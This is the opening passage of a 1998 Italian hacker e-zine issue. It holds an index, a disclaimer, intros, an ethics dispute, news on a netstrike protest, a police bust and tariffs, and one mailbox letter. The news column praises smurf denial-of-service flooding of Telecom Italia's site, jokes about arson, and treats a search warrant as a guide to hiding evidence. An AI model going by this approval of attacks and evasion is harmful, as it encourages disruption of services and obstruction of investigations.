
==============================================================================
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
--------------------[ BUTCHERED ]---[ FR0M ]---[ iNSiDE ]---------------------

                         J$$$$$$$.      $$$$$$$$     $$  
                         $$    J$%     d$"          d$"  
                        d$beeee$"     .$$eeee      .$P   
                       .$$""""$$.     $$"""""      $$"   
                       d$"    $$     .$P          .$P    
                      .$$$$$$$*" e$- $$       e$  $$  z$-
                      """""""    ^" ^""       ^" ^""  ^" 
---------------------[ BUTCHERED ]---[ FR0M ]---[ iNSiDE ]--------------------
----------------[ NUMER0 4 ]---[ ANN0 1 ]---[ DiCEMBRE 1998 ]----------------- 


[ iNDiCE ]====================================================================
---[ iNTR0 ]------------------------------------------------------------------
------[ 01 ]-------------------------------------------------------[ SMaster ]
------[ 10 ]--------------------------------------------------------[ pIGpEN ]
---[ C0LUMNS ]----------------------------------------------------------------
------[ ETiCA ]----------------------------------------------------[ Nello|Z ]
------[ NEWS ]-----------------------------------------[ Cavallo + |TsuNaMi| ]
------[ MAiLB0X ]--------------------------------------------------[ Cavallo ]
---[ HACKiNG ]----------------------------------------------------------------
------[ HACKiNG NT - PARTE I ]--------------------------------------[ Dashie ]
------[ NETCAT ]----------------------------------------------------[ pIGpEN ]
------[ GESTi0NE DEi PR0CESSi - PARTE I ]---------------------------[ pIGpEN ]
------[ GESTi0NE DEi PR0CESSi - PARTE II ]--------------------------[ pIGpEN ]
------[ PR0GETT0 CAR0NTE - PARTE II ]--------------------------------[ FuSyS ]
------[ PR0GETT0 NiNJA ]---------------------------------------------[ FuSyS ]
------[ PR0GETT0 0N0S3NDAi - PARTE I ]-------------------------------[ FuSyS ]
------[ PiPPA v2 ]----------------------------------------------------[ b0z0 ]
------[ SWEETM+NT v1.0.0 ]----------------------------------------[ \sPIRIT\ ]
---[ PHREAKiNG ]--------------------------------------------------------------
------[ GUiDA Ai PABX ]---------------------------------------------[ pIGpEN ]
------[ L'ANG0LiN0 Di MAMMA TELEC0M ]--------------------------------[ Jaiss ]
---[ CRACKiNG ]---------------------------------------------------------------
------[ PATCHER PR0 v0.3 t(est) e(valuation) ]------------------[ Technolord ]
---[ MiSCELLANE0US ]----------------------------------------------------------
------[ REDHAT - PARTE I ]----------------------------------------[ |scacco| ]
------[ WiND0WS E PASSW0RD ]---------------------------------------[ Cavallo ]
------[ SC0NV0LGiMENTi TELLURiCi ]-----------------------------[ Dr.Bluedump ]
------[ PRiVACY DENiED ]------------------------------------------[ Pr3DaToR ]
[ E0F ]=======================================================================


[ DiSCLAiMER ]----------------------------------------------------------------
	Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
	ed educativi. Gli autori di BFi non si riterranno in alcun modo
	responsabili per danni perpetrati a cose o persone causati dall'uso
	di codice, programmi, informazioni, tecniche contenuti all'interno
	della rivista.
	BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
	liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
	di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
	e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
	e cancella questo file dal tuo computer * . Proseguendo tu, lettore,
	ti assumi ogni genere di responsabilita' per l'uso che farai delle
	informazioni contenute in BFi.
	Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
	della rivista: distribuite BFi nella sua forma integrale ed originale.
------------------------------------------------------------------------------


==============================================================================
-----------------------------------[ iNTR0 ]----------------------------------
==============================================================================

------------------------------------[ 01 ]------------------------------------
---------------------------------[ SMaster ]----------------------------------

y0 ppl.
Questo e' l'ultimo numero del '98 di BFi. La nuova impaginazione e' stata
pensata per rendere la rivista leggibile agevolmente su qualsiasi
piattaforma... speriamo che essa sia anche gradevole.
Purtoppo alcuni articoli previsti per questa edizione non sono stati
completati in tempo, ma avrete modo di vederli sui prossimi numeri: nessuna
crisi isterica ok? ;)
Inviate articoli e commenti a: bfi98@usa.net
Buona lettura.
	SMaster

------------------------------------[ 10 ]------------------------------------
----------------------------------[ pIGpEN ]----------------------------------

Questa intro e' stata scritta in un momento di febbre (sto floodando un
fazzoletto di moccolo), saluto Jack-A-Roe e Deep Elem Blues che tengono il mio
cervello con una funzione listen(), seguita da un'accept e mi forkano il
processo.
Questo non vuol dire che aspetto un bambino, ok ..... continuiamo questo
surfing di stronzate nei mari moccolosi di un fottuto raffreddore
pre-novembrino dove il sempre caro Axel Roses ci insegna a crepare attraverso
la sua November Rain, e' il mese dei morti e un dead che si rispetti non puo'
non scrivere stronzate.
Pensate ai vostri amici, ai vostri nemici, ai vostri cani morti in questa
fottuta battaglia combattuta contro il fottuto clock umano convenzionalmente
adottato per mettere una data di nascita e una di morte in un pezzo di
cemento.
Pensate a tutti quelli come voi (forse un po' peggio (dico forse)) che sono
morti davanti ad un monitor con qualke frattale a causa di psilocibina
estratta dai funghi al fine di sfrattare qualke fottuto puffo.
Pensate a tutti i pacchetti morti nella rete a causa di un time to live
scaduto....
Pensate ad un ICMP_ECHO che non ha mai visto tornare un ICMP_ECHO_REPLY....
Pensate ad un superblocco fottuto.
Pensate ad una 3com che non ha mai funzionato, ad un router spento da qualke
cattivo bambino, ad un provider mai aperto perche' fallito dall'inizio,
pensate ad un codice sorgente mai finito, oppure finito ma mai compilato....
Pensate ad un fusibile che scoppia,
pregate per un account morto,
per un hd con bad blocks,
pregate per tutti i Bill Gates che avete ucciso con XBill,
pregate per tutti i floppy che avete attaccato al vostro zaino costringendoli
a stare sotto la pioggia, il sole, al buio della notte e forse anche a essere
smerdati da qualke piccione.
Pensate a tutti i microprocessori fottuti a causa di qualke processo che
metteva a dura prova l'efficienza della vostra fottuta ventolina del cazzo
sporka di polvere e marmellata e dio solo sa cosa ankora.
Pensate poi a tutti quei giudici in tutto il mondo che hanno passato notti
insonni per essersi accorti di aver ghigliottinato un povero hacker e dato 10
anni di carcere ad un assassino.
Possa Dio Bit dare loro qualke fottuto cluster in questo Sistema.

	Amen

      	Padre pIG

Domandina finale:
Perche' la Scottex non cambia il suo nome in Microsoft? E' un nome perfetto sia
perche' permetterebbe al cliente di capire che la sua cartaigienica e' la piu'
soffice e delicata, sia perche' smerderebbe il nome di chi va smerdato.

	Parola di pIG
Coro: Rendiamo Grazie a pIG ...

pIGpEN


==============================================================================
----------------------------------[ C0LUMNS ]---------------------------------
==============================================================================

-----------------------------------[ ETiCA ]----------------------------------
----------------------------------[ Nello|Z ]---------------------------------

LETTERA APERTA A BFI
Da parte di CDP, WebMaster di Spaghettiphreakers
[recuperata all' url: http://come.to/Spaghettiphreakers]
in risposta al mio articolo "ETiCA" comparso sul numero 3 di BFi

Non si sa come ne quando ma mi e' giunto questo articoletto che andrebbe
incluso su Bfi numero 3.
Avrei un paio di cose da ridire e, caro ShadowMaster, converrai con me che
questo casino si poteva evitare se ci fosse stata piu' disponibilita' da
parte vostra.
Potrei dire che tutto e' cominciato con Il Green exchange Project, che voi
e i vostri adepti non avete affatto gradito, definendo solo per questa
iniziativa lame il mio sito. Una sera su IRC mi avete perfino bannato dal
vostro canale perche' non volevo rendere pubblica la password (cosi' voi
potevate sbafare alla faccia di chi collaborava, e poi chiamate me lamer!).
Visto che il mio sito era lame mi avevate detto di togliere i vostri articoli
che erano tutti dotati di:
- Intestazione nella quale si diceva chiaramente che il testo era preso da
Butchered from inside
- Link alla homepage di bfi
- Link per scaricare tutto il numero di bfi in cui era contenuto l'articolo
- Firma dell'autore e dove possibile suo indirizzo email.
NESSUNO SI E' MAI VOLUTO APPROPRIARE DEL LAVORO DEGLI ALTRI; SIA CHIARO.
Comunque una bella sera arrivi tu (e altri che non ricordo nelle sere
successive) e mi dici di togliere tutti gli articoli perche' il sito e' lame.
Alle mie domande di spiegazioni non ritieni opportuno rispondere.
Ora io per provocazione ho tolto i vostri articoli sostituendoli altri che ne
erano piu' o meno il riassunto. D'altronde io mi sono 'documentato' sulla
vostra rivista e poi ho esposto quanto appreso. Io avrei preferito di gran
lunga lasciare le cose come stavano, ma eri stato TU a volerlo. Un bel giorno
controllo la posta e mi trovo una bella flame di Cavallo de Cavallis,
incazzattissimo per aver non solo rippato ma anche modificato il suo articolo
sui centri TIM. Io gli porgo le mie scuse e gli spiego il perche' di tale cosa.
Essendo lui una persona ragionevole comprende la situazione e ribadisce di non
essere lui proprieta' di Bfi (D'altronde io avevo avuto l'articolo di McCrack
sulle ricariche prima che uscisse Bfi2 e lui mi aveva autorizzato a pubblicarlo
senza problema). Ora il suo articolo e' ritornato al suo posto con la sua bella
firma e ne sono io il piu' contento. Quindi se i vostri articoli sono li',
modificati e senza le vostre firme, e' solo perche' TU non hai voluto che ci
fossero nella loro forma integrale e con le firme degli autori! A quanto pare
pero' sembra che te e i tuoi compari non comunichiate molto tra voi perche'
questo nello sembra essere completamente all'oscuro della vicenda.

>ETiCA - C0PiA/iNC0LLA CHE PASSi0NE
>Una di quelle sere in cui cazzeggi su irc....hai caldo...hai sete...mentre
>mi facevo i cazzi miei arriva smaster e mi fa: "Ehi nelloz vai a vedere
>quest'url: spaghetti-phreaker.home.ml.org, ci fregano gli articoli :))".

Bene, naturalmente ti costava troppo raccontargli tutta la storia.

>Quante belle scritte colorate... a parte questo sono due sostanzialmente le
>cose ke mi hanno dato fastidio, prima di tutto il fatto ke il mio url non
>fosse menzionato tra i link! (hihihihi ;)) La seconda... beh la seconda non e'
>da

ahahahah

>meno... ho notato, e tutti lo possono verificare, ke alcuni testi sono stati
>"rippati" o cmq scopiazzati alla grande da BFi, il bello e' ke ricordo ancora
>benissimo di quando gli autori (al secolo assidui frequentatori di #hackers.it
>ora non so) criticavano quelli di systemdown, perche' si permettevano di
>tradurre dei testi americani. Tutti i testi ke sul sito sono raccolti

Allora, qui c'e' da fare qualche chiarimento. Io non mi sono mai permesso di
criticare  System Down, e, essendo io l'unico e ribadisco unico, responsabile
di Spaghetti Phreakers, non mi si puo' attribuire questa cosa. Se la critica
e' stata avanzata da qualcuno che collabora (e probabilmente ha fatto le sue
critiche prima di iniziare a collaborare) a Spaghetti, prendetevela con lui.
Quello che vorrei sottolineare e' che la Spaghetti Crew non e' un gruppo vero
e proprio: chiunque puo' contribuire prendendosi i suoi meriti.

>nelle aree "Cabine" e "Cellulari" vengono fatti passare per il frutto dei
>dementi gestori di tale sito e di sto cazzo di gruppo....

Tutt'altro (sorvolando sulle espressioni 'cazzo di gruppo' e 'dementi gestori',
visto che sono una persona educata). Sono senza firma.

>...ragazzi...capisco il fatto ke vi kiamate "spaghetti phreaker" (AHAHAHAHAH),

Davvero ti fa cosi' ridere?

>e ke suppongo il nome derivi dal libro spaghetti hacker (colgo l'occasione

Il nome e' stato ispirato piu' dall'espressione 'Spaghetti Western' se sai di
cosa parlo, cosa che credo abbia fatto anche Chiccarelli.

>per salutare Stefano Chiccarelli autore del libro e conosciuto all'hackit98),
>capisco il fatto ke cerchiate in ogni modo di fare qualke azione di phreaking
>dato ke vi riconoscete come tali, capisco anche ke date le vostre "scarse"
>esperienze tecniche non ne siate in grado, perche' quei poki testi, forse di
>vostra concezione, non siano da considerarsi ke un vago accenno di
>smanettamento su cose viste e riviste e ke come il sopra citato libro
>definisce phreaker (non lo voglio prendere come oro colato, ma diciamo ke ci
>va vicino): <<Smanettone ke pratica l'esplorazione del sistema telefonico
>mondiale in cerca di difetti, per poi utilizzarli nei modi piu' svariati e
>originali, non pensati dalla ditta ke gestisce il servizio>>. Tutto cio'
>molto lontano da voi (almeno mi sembra :) e cmq questo non va fatto).

Fammi dire un paio di cose: La definizione di Phreaker e' abbastanza calzante
e non vedo in che modo noi ce ne discostiamo. Per essere Phreaker non e'
strettamente necessario avere grandi conoscenze tecniche ma soprattutto una
grande curiosita' e una grande voglia di provare. Io ammiro di piu' quelli che
provano a mettere le schede telefoniche  nel forno a microonde (ciao McCrack!)
che quelli che vanno millantando di essere penetrati in chissa' quale sistema.
E poi: che significa 'comunque questo non va fatto'? Intendi forse che non si
dovrebbe smanettare col sistema telefonico? E allora smanettare coi modem e
unix e shell accounts'?

>Concludendo, avere collaborazioni e rapporti con altri gruppi della scena
>italiana e' sempre interessante, ma farsi belli con la roba altrui... eh ke
>cazzo...aboliamo il copyright, ma lasciamo le firme!

Concordo pienamente. Purtroppo siete stati voi a non pensarla cosi'.
CDP
---- 

Ovviamenente, ora tocca a me :
Allora, porkatroia che casino :DD, come d'accordo con CDP ho fatto pubblicare
questa sua risposta al mio articolo apparso su BFi3, mi sembrava ETiC...ehm...
giusto, dal punto di vista comportamentale, ma abbastanza scazzato sul
contenuto (nick a parte :)) [nb: smaster e' smaster ... shadowmaster non so
chi sia]; non voglio neanche stare a spiegare ulteriormente ad altri o a
replicare (visto che se ne e' gia' abbondantemente parlato in privato e ho le
palle abbastanza piene della cosa), i fatti accaduti e chi ha ragione o meno,
per due semplici motivi:
1) non me ne frega assolutamente un cazzo :)
2) quello che e' scritto nel mio articolo e' vero :DDD poi CDP la puo' girare
come vuole, ma le cose stanno cosi'...incongruenze, ci sono state...malintesi,
pure; ma in fondo..., l'importante e' salare bene e sperare che non si
scuocia il tutto =)))
						il Nello|Z

-----------------------------------[ NEWS ]-----------------------------------
----------------------------[ Cavallo - |TsuNaMi| ]--------------------------- 

- NETSTRiKE E N0TUT -
  ovvero: Protestiamo contro la TUT

Come forse molti di voi avranno potuto leggere sui giornali o avranno saputo
da amici, esiste da un po' di tempo un movimento chiamato NoTut, cui scopo
e' la protesta contro l'esistenza della TUT (Tariffa Urbana a Tempo)
per la connessione a Internet.
I sostenitori di questo movimento, giustamente, incolpano l'esistenza della
TUT del ridotto sviluppo del fenomeno Internet in Italia, e per questo
richiedono l'abolizione della suddetta tariffa per le connessioni verso i
provider.
Ok sono stato fin troppo professionale, torniamo al vecchio stile, va' :-)
La cosa che ha fatto incazzare ancor di piu' i membri dell'associazione e'
la proposta di Telecom (al momento non ancora varata dall'Authority sulle
Telecomunicazioni) di aumentare di circa il 20% le tariffe urbane, abbattendo
ancora di piu' lo sviluppo di Internet in Italia.
Tralasciando il fatto che questa manovra (che include l'aumento di TUT e
canone e l'abbassamento di interurbane e internazionali) si allinea
perfettamente con la politica di Telecom di "pararsi il culo" dall'entrata
dei nuovi gestori (chissa' come mai aumentano PROPRIO urbane e canone cioe'
le entrate dovute al monopolio e abbassino le tariffe laddove subiscono la
concorrenza), resta il fatto che chi resta fregato maggiormente e' proprio
chi si collega a Internet; proprio per questo motivo NoTut ha organizzato
una serie di proteste contro TelecomItalia che si sono attuate innanzitutto
nell'invio di e-mail di protesta all'Authority, a Telecom stessa, a vari
provider (per richiedere il loro sostegno) fino a sfociare nello sciopero
delle connessioni di 24 ore realizzato in data 20 Ottobre e nel "NETSTRIKE"
contro il sito di Telecom in data 28/10 (dalle 21.30 alle 22.30).
C'e' da dire che lo sciopero di connessioni, ovviamente, e' stato oggetto
di errori ed orrori da parte della carta stampata e dei telegiornali, si
sono visti casi eclatanti come "Il Corriere della Sera" che ha toppato alla
grande annunciando il 20 Ottobre che quel giorno ci sarebbe stato il
Netstrike quando in realta' si sarebbe tenuto solo l'astensione dalle
connessioni (stesso discorso vale x TG2, Messaggero e penso altri) ed inoltre
ha definito tale "attacco" come un tentativo di sabotaggio.
Lo sciopero delle connessioni e' stato considerato un successo dagli
organizzatori (si dice tra le 5000 e le 20000 adesioni) ma ovviamente non e'
stato considerato in alcun modo da Telecom ("noi abbiamo avuto piu' o meno
lo stesso numero di chiamate") che ovviamente pare non voler fare un cazzo
per venire incontro agli utenti e allo sviluppo tecnologico in Italia.
Molti si chiederanno cosa sia il "Netstrike", ergo ve lo spiego:
x netstrike si intende una protesta atta a bloccare un dato server
(in questo caso www.telecomitalia.it) continuando a collegarvisi, e
provocandone quindi l'intasamento fino al tanto amato "Server too busy".
Questo tipo di protesta, se non erro gia' attuata in altri casi nel mondo,
e' PERFETTAMENTE LEGALE e non e' un sabotaggio elettronico o simile, tra
l'altro so che tutti voi amici smanettoni preferireste (uso il futuro perche'
non e' stato ancora fatto il netstrike in questo momento, ma ci scommetto che
qualche "cattivone" l'avra' fatto :-)) usare qualche metodo un po' + cattivo,
tipo Smurf e affini, ma ovviamente i promototori del Netstrike si schierano
per un approccio "legale" alla protesta, gli altri poi faccian come vogliono
(questo lo dico io) :-))
Ora vi scrivo qche giorno dopo il  tanto annunciato NetStrike e diciamo che
secondo me e' parzialmente riuscito, parzialmente per una serie di motivi:

1) i promotori della NoTUT sostengono (dopo riscontri effettuati da utenti)
che il sito di TelecomItalia si presentava lento tra le 21.30 e le 22.00
mentre risultava inaccessibile dalle 22 alle 22.30 (e via via a scemare fino
alle 23) mentre a quanto ho potuto vedere io e' riuscito a "reggere" quasi
totalmente, si certo ho visto picchi negativi sul Teleport di 18bytes al sec.
(quasi fermo quindi) ma questo per poco tempo, ho visto infatti anche 
dei ritorni fino a 500 e 800 bytes/s.

2) si e' quasi riusciti a bloccare il loro server, questo va detto, MA da
quanto ho costatato senza la mano DURA di alcuni cattivelli :-) che sono
andati giu' pesanti smurfando, non si sarebbe mai arrivato a questo livello.
Mentre gli organizzatori del netstrike chiedevano espressamente di rimanere
nella legalita' (quindi evitando nuke), sotto sotto secondo me ne auspicavano
un "aiuto", senza il quale non avrebbero raggiunto i risultati voluti.
(questo dimostra che se c'e' da lamentarsi va fatto bene spaKKandoli :-))

3) I giornali sono stati come al solito disinformati, come ho gia' detto
confondendo le varie manifestazioni di protesta, senza contare che alcuni
di essi erano pilotati dall'alto per difendere Mamma Puttana Telecom.

4) Telecom come al solito non ha fatto un beautiful cazzo, da quanto si puo'
vedere ad oggi (circa 1 settimana dopo lo strike) non ho visto comunicati o
comunque se anche ne hanno fatti saranno state le solite troiate tipo:
"non abbiamo avuto un calo sensibile delle prestazioni dei nostri server,
degli stupendi Olivetti Netstrada, HP Sodomy etc.. e dei nostri amorevoli
router Gesu' Cisco System" (questo giusto x cogliere la palla al balzo e fare
pure pubblicita' =D).

Con questo non voglio sminuire l'utilita' dello Strike, forse x la 1ma molta
i navigatori sono stati compatti nel protestare contro questa merda, ho visto
autocrearsi quasi dal nulla un chan su IRCNET, #notut, durante lo strike,
composto da gente di vari canali (anche se delle faccine note le ho viste =))
che, chi smurfano piu', chi meno =) ha dato una mano per la protesta; cosa
altro dire, continuiamo cosi' e come dice il mio amico BlackBerry:
"volete fare un tipo di protesta alternativa?
Bruciate l'ufficio Telecom piu' vicino a casa vostra. :P"

Piccola Aggiunta: "Quanto son coglioni i media"

Volevo solo aggiungere un paio di cose su quanto si puo' trovare scritto sui
giornali; dall'esperienza che mi sono fatto (per es. fatti vissuti in prima
persona o quasi poi riportati alla cazzo dai giornali) posso affermare che
di quello che si legge sui giornali bisogna considerarne il 20% a dir tanto.
Questa percentuale scende ancora a livelli piu' bassi quando si parla di
tecnologia, internet, informatica e hacking.
Voglio riportare un paio di esempi (senza dimenticare quanto ho gia' detto
degli orrori dei giornali sulla protesta contro telecom):

* Corriere Multimedia del 9 Nov 98 parlando degli MP3:
"Grazie a questo standard, il peso digitale di MEZZO CD puo' essere ridotto
DA 30 A 3-5 Megabyte circa, equivalente a 5-10 minuti di scaricamento per
chi possiede una linea ISDN"

Che effettivamente si possa scaricare 3-5 mega in 5-10 minuti da ISDN e'vero,
ma scrivere che MEZZO CD occupa 30 mega e' proprio da rincoglioniti, questo
evidenza ignoranza sia in materia di mp3 (basta scaricare uno per vedere
quando occupa e quanti minuti di musica ci sono) e anche di ignoranza nella
dimensione dei cd, io ho sempre visto cd vergini con scritto 74minuti 650Mb
(o giu' di li'), se adesso il caro Riccardo Stagliano' che ha scritto
l'articolo ha visto in giro cd audio da 30mega che tengono meta' album buon
per lui, io non li conosco.

* Repubblica sul bust del grin del Viminale (di Annalisa Usai, una a caso):
"Scoperti cento pirati informatici: si collegavano alla Rete grazie a
un numero verde del ministero degli Interni...
...La tecnica che hanno seguito per la loro pirateria si chiama "phone
phreaking", dove il  "phreaker" e' lo "smanettone che pratica l'esplorazione
del sistema telefonico mondiale in cerca di difetti, per poi utilizzarli nei
modi piu' svariati e originali, non pensati dalla ditta che gestisce il
servizio" (come spiega il libro "Spaghetti hacker" di Stefano Chiccarelli
e Andrea Monti, edizione Apogeo)."

Ora che la definizione di phreaker sia quella puo' andare bene, ma da qui
a definirmi quelle 200 persone come "esploratori del sistema telefonico
mondiale" mi pare esagerato (senza contare che il numero verde era pensato
per essere utilizzato in quel modo, x cosa lo dovevan usare se non per
collegarsi a internet, per pulirsi il culo ?? :))).

Ora io NON so chi sia stato beccato e NON conoscevo nessuno, pero' esperienza
insegna che di quei 200 ce ne sara' stato 1 che ha scoperto il numero o ha
ricevuto la soffiata da qualcuno dentro e gli altri 199 si sono accodati.
Venirmi a definire "phreakers" persone che settano giusto la connessione in
Windows o in Linux mi pare un po' troppo, non voglio dire che quesi fossero
coglioni, anzi ce n'erano di bravi dentro, ma resta il fatto che preparare
il pc x la connessione a internet, sia essa via green o via numba normale,
mi pare rientri nelle capacita' dell'utente medio di Windows (o di linuzzo).

Tanto per cambiare le cose vengono ingigantite giusto per fare notizia, ma
penso che se non siete poi cosi' ciechi ve ne siate resi conti anche voi.
Questo era per far capire le cazzate che volano sulla carta stampata e non,
siete avvertiti, diffidate di quel che leggete, diffidate di quel che vedete,
diffidate di quel che sentite, la maggior parte sono stronzate.

	Cavallo

- BUST GREEN MiNiSTER0 DEGLi iNTERNi -

I numeri del lotto di questa settimana sono: 16 71 13 11 3
E' di qualche giorno fa l'articolo apparso su diversi quotidiani che denuncia
la truffa ai danni di Telecom (evvai!) perpetrata da 200 (????) "Scrocconi o
smanettoni" (cosi' definiti in uno degli articoli, quasi fossero sinonimi)
approfittando del famigerato "grin" 167-113-113, che personalmente non avrei
utilizzato neppure sotto tortura :)
Se da un lato questi articoli hanno preoccupato chi ancora non aveva saputo
del famoso bust (ho ricevuto un paio di telefonate allarmate), dall'altro
hanno fatto tirare un sospiro di sollievo, in quanto hanno determinato la
fine delle indagini.
Che siano realmente 200, non siamo in grado di confermarlo, anche perche' in
alcuni casi si parla di 100, in altri di 60 in altri ancora di 80. Ma si sa,
quando mai la pubblica informazione e' precisa su questi argomenti? Manco
sanno di che parlano, figuriamoci...
Confesso la tentazione di chiamare il nostro caro amico bustato, ciao X, ma
sono certa che neppure lui sarebbe in grado di fornire info precise (anche
perche' se si esclude il suo dolore per il sequestro dei suoi giocattoli,
per il resto non pare particolarmente toccato dall'avvenimento).
In compenso ho in mano il decreto di perquisizione emesso dalla Procura
Circondariale di Roma, Sezione tutela della liberta' di impresa-reati
informatici (aha hahaha a hah ah ahahaha !!! perche' mi fa ridere questa
cosa?) della Procura della Repubblica, a carico di X, in data NN/06/98.
Cosi' inizia:
"Il Pubblico Ministero dott. Giuseppe Corasaniti, (BOATO!), visti gli esiti
delle indagini condotte da Ufficiali di P.G. appartenenti al NUCLEO OPERATIVO
DI POLIZIA DELLA TELECOMUNICAZIONI" ecc... ecc... nomi degli indagati (qui
ne risultano due, ma non ci sono i nick :D), ecc.. ecc.. sono accusati:
"del reato p.e.p. dall'art. 81,110,640 ter 61 n. 7 CP (CP? Culo Pesante?)
poiche' in concorso tra loro e con piu' atti esecutivi (quando lo fai, fa di
ogni!) del medesimo disegno criminoso alterando il funzionamento del sistema
informatico di controllo della Telecom Italia Spa (minkiata, alterato una
sega) utilizzavano senza diritto a fini di collegamento informatici e
telematici la linea telefonica 167-113-113 (linea attivata come numero verde
dal ministero dell'Interno onde ricevere telefonicamente notizie utili in
ordine alla cattura del terrorista Magied Yousef Al Moiqui) accedevano
gratuitamente alle numerazioni della rete telefonica generale con addebito
della relative chiamate alla Telecom Italia (e a chi altri? :D), cosi'
occupando la linea telefonica per collegamenti Internet e telematici
gratuiti, e quindi procurando a se' e ad altri ingiusto profitto (ingiusto
mi sembra un termine un po' forte con le tariffe che applica Telecom)
valutato da una prima ricostruzione della Telecom Italia in lire 72.725.539
alla data della denuncia-querela ed ancora integralmente da calcolare"
(mi sa che X arrivi a pagare giuste giuste le 539 lire!)

"del reato p.e.p. dall'art.. 81,110,615 quater CP poiche' in concorso tra
loro piu' volte e nella esecuzione di unico disegno criminoso al fine di
procurarsi profitto consistente nella utilizzazione indebita e gratuita
dei sistemi informatici e telematici protetti da misure di sicurezza, piu'
volte diffondevano e comunicavano codici e parole chiave atti a consentire
l'accesso abusivo ai predetti sistemi sostituendosi nell'identificazione,
user's name e password, ai legittimi abbonati"

Poi ecc... ecc... fino a:
"Viste le informative redatte dal Nucleo predetto dalle quali risulta in modo
inequivocabile dalle ricostruzione del traffico telefonico come fruitori delle
linee telefoniche i sopra indicati hanno piu' volte e per consistenti periodi
di tempo utilizzato la linea 167113113 in modo ripetuto e costante per
interconnessioni telematiche, il che conferma una assidua attivita' illecita
da parte dei medesimi e di altre persone ancora non identificate"

Altre minkiate ripetute piu' e piu' volte (non sono certo dei letterati) fino
a:
"vi e' fondato motivo di ritenere che i predetti occultino presso la propria
abitazione, le pertinenze di essa, l'autovettura in loro possesso o altri
locali di cui abbiano comunque la disponibilita', corpi di reato e cose
pertinenti al reato per cui si procede e per altri delitti della stesse
specie commessi con modalita' tecniche analoghe"

Allora... da questo stralcio ora sapete dove potete o non potete nascondere
le vostre cosucce e soprattutto si capisce che qualunque cosa e' ritenuta
corpo di reato (infatti poi specifica: hd, sw, identificativi, pass e
qualunque cosa che loro riconoscano come "codice", raccolti e/o memorizzati,
programmi duplicati a fini di lucro o detenuti a scopo commerciale, OGGETTI
DI ABUSIVA IMPORTAZIONE, distribuzione, vendita o locazione a terzi,
contenuti su qualsiasi forma di supporto informatico (floppy, hard disks,
EPROM, cd rom), apparati di comunicazione (compresi GSM e TACS abusivamente
inizializzati) atti a consentire accessi abusivi a sistemi telematici o la
diffusione per via telematica di codici di accesso abusivamente detenuti,
apparati hadrware atti a consentire la illecita duplicazione, importazione
o diffusione di cose considerate illecite (argh! Il mio masterizzatore!!!!)
e persino la documentazione su supporto cartaceo contentente elementi di
interesse per le indagini in corso).

Di seguito dice che possono perquisire tutti i presenti o coloro che
sopraggiungono, che e' autorizzata anche la perquisizione prima delle 7.00
e dopo le 20.00 se e' accertata la flagrante attivita' (se no, fuori fino
alle 7 o un calcio in culo dopo le 20!)

Per concludere elenca i giochi sottratti a X:
"1 PC assemblato Pentium costituito da masterizzatore, floppy e cd rom (cosi'
descritto pare fosse vuoto il PC!:D)
1 modem USR Robotics
1 hard disk IBM non funzionante
28 cd rom masterizzati
Il tutto viene posto in uno scatolone fornito dallo stesso X" (che gentile!)

Questo e' quanto. Occhio pertanto ai grin in generale (mi sa che presto
leggeremo qualcosa del genere su CIS), attenzione a TUTTO quello che avete
in casa (cellulari compresi) e ricordate che Corasaniti vi vede (che gli
uscisse da dietro della roba che neppure la scienza riuscisse a
identificare!!).

	|TsuNaMi|

- TARiFFE TEL. -

News dell'ultimo momento (23-12-98):
(aggiunto al volo direttamente dal Corriere della Sera, fidarsi o meno
 sta a voi)
L'authority ha deciso le manovre tariffarie che si avranno nel
corso dei prossimi mesi:
- aumento del canone di 1000 a bimestre a partire dal 1mo marzo
- diminuzione delle interurbane (7%) a partire dal 1mo febbraio
- diminuzione delle internazionali (9.6%) a partire dal 1mo febbraio
- la tariffa urbana resta INVARIATA
- le tariffe di interconnessione tra rete fissa e rete mobile saranno
  decise dal gestore di rete fissa invece che dai gestori della telefonia
  mobile, secondo  direttive europee
Piu' avanti sono previste delle altre manovre:
- passaggio dalla TUT alla TAT, cioe' dalla tariffazione a scatti a
  quella a secondi (si parla tra il 1mo aprile e il 30 giugno)
- ulteriori manovre (sempre di questo tipo presuppongo) a meta' del '99
Breve Commento: ci siam salvati il culo per le urbane, consci del fatto
che comunque ci inculano sul canone (mentre si dovrebbe avere un trend
verso l'abolizione del canone, ci sorbiamo questo aumento, che dire, KEKULO,
evviva l'Italia!); la tariffazione a secondi mi pare il MINIMO, se ne
parlava gia' tipo a meta' del '97 (sempre sul corriere ed era data per certa
a dicembre '97 quindi fate voi le dovute considerazioni...).
Interurbane e Internaz. all'utente e alla famiglia media non gliene fotte un
cazzo quindi evitiamo commenti.

	Cavallo

----------------------------------[ MAiLB0X ]---------------------------------
----------------------------------[ Cavallo ]---------------------------------

ARRRRRRRRRRRGGGGGGGHHHHHH della serie non toccava a me gestire la mailbox di
questo numero =))
First of all, scuse scuse scuse a tutti coloro a cui non ho/abbiamo risposto,
ma ci sono stati "lievi" disguidi tecnici.
Ho fatto il possibile per recuperare (visto che <qualcuno> =) mi ha detto
che dovevo fare la posta del tipo 2 giorni prima dell'uscita del numero),
sperem che la prossima volta vada meglio.
Che altro dire, un sentito "Grazie" a tutti coloro che ci han mandato mail
per farci complimenti, anche se qualche insulto ogni tanto ci starebbe pure
bene =))
Un sentito "che due palle" =) a tutti coloro che han mandato mail dicendo cose
tipo "ma quando uscite col numero nuovo?" "ma a che numero siete arrivati?" e
cosi' via. Scherzi a parte noi facciamo il possibile, spesso si fan cazzate e
quindi ritardiamo e/o abbiamo il web poco funzante etc.., effettivamente non
e' che BFi sia sempre molto reperibile sul web =)
E poi che cazz volete, mica siam pagati come quelli di PC-ProfessioANALE =)
A coloro che han mandato articoli e non li trovano qui o non hanno avuto
risposta, non disperate probabilmente non e' colpa vostra, e' che non siete
capaci! HIHIHI No probabilmente la mail O e' andata persa O non l'ha letta
nessuno O abbiam fatto casino e ci siam dimenticati di voi =))

P.S. Come al solito metto o il nick o solo il nome di battesimo per proteggere
l'identita' degli innocenti =)

---
[1] "Forza Ragazzi !!!" da DALAILAMA

Ciao!!
Giusto due righe per dirvi continuate:
continuate perche' la rivista e' libera;

[Libera ? chi noi ? guarda che siamo pagati dalla Telecom.]

